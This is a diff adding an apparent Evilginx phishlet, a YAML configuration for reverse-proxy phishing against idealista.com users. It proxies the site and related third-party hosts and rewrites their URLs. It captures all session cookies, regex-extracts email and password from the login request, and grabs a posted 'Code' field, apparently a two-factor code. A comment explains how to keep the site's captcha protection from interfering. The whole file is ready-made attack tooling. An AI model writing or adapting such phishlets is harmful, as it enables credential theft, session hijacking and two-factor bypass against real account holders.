@@ -1,0 +1,69 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+# Captcha sometimes may not work correctly "Please enable JS and disable any ad blocker" when uncommenting some hosts. For this number, phishlets works flawlessly.
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'idealista.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'idealista.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'st3', orig_sub: 'st3', domain: 'idealista.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'st4', orig_sub: 'st4', domain: 'idealista.ac', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'img4', orig_sub: 'img4', domain: 'idealista.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'dp', orig_sub: 'dp', domain: 'idealista.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'tag', orig_sub: 'tag', domain: 'aticdn.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'script', orig_sub: 'script', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'dd', orig_sub: 'dd', domain: 'idealista.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'integration2', orig_sub: 'integration2', domain: 'idealista.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'col', orig_sub: 'col', domain: 'idealista.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'o', orig_sub: 'o', domain: 'clarity.ms', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'sdk', orig_sub: 'sdk', domain: 'privacy-center.org', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www1', orig_sub: 'www1', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
+  #- {phish_sub: 'go', orig_sub: 'go', domain: 'captcha-delivery.com', session: true, is_landing: false, auto_filter: false}
+  #- {phish_sub: 'ct', orig_sub: 'ct', domain: 'captcha-delivery.com', session: true, is_landing: false, auto_filter: false}
+  #- {phish_sub: 'static', orig_sub: 'static', domain: 'captcha-delivery.com', session: true, is_landing: false, auto_filter: false}
+  #- {phish_sub: 'dd.prod', orig_sub: 'dd.prod', domain: 'captcha-delivery.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'geo', orig_sub: 'geo', domain: 'captcha-delivery.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.idealista.com', orig_sub: 'www', domain: 'idealista.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'st3.idealista.com', orig_sub: 'st3', domain: 'idealista.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'sdk.privacy-center.org', orig_sub: 'sdk', domain: 'privacy-center.org', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'www1.gstatic.com', orig_sub: 'www1', domain: 'gstatic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'dp.idealista.com', orig_sub: 'dp', domain: 'idealista.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'dd.idealista.com', orig_sub: 'dd', domain: 'idealista.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'o.clarity.ms', orig_sub: 'o', domain: 'clarity.ms', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'www.idealista.com', orig_sub: 'geo', domain: 'captcha-delivery.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'www.idealista.com', orig_sub: 'ct', domain: 'captcha-delivery.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'ct.captcha-delivery.com', orig_sub: 'ct', domain: 'captcha-delivery.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'geo.captcha-delivery.com', orig_sub: 'geo', domain: 'captcha-delivery.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'go.captcha-delivery.com', orig_sub: 'go', domain: 'captcha-delivery.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'static.captcha-delivery.com', orig_sub: 'static', domain: 'captcha-delivery.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+  - {triggers_on: 'dd.prod.captcha-delivery.com', orig_sub: 'dd.prod', domain: 'captcha-delivery.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript', 'image/webp', 'image/apng', 'image/avif', 'application/signed-exchange']}
+ 
+auth_tokens:
+  - domain: 'www.idealista.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+  - '/'
+
+credentials:
+  username:  
+    key: ''
+    search: '"email":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    key: 'Code'
+    search: '(.*)'    
+    type: 'post'
+
+
+login:
+  domain: 'www.idealista.com'
+  path: '/login'
+
+
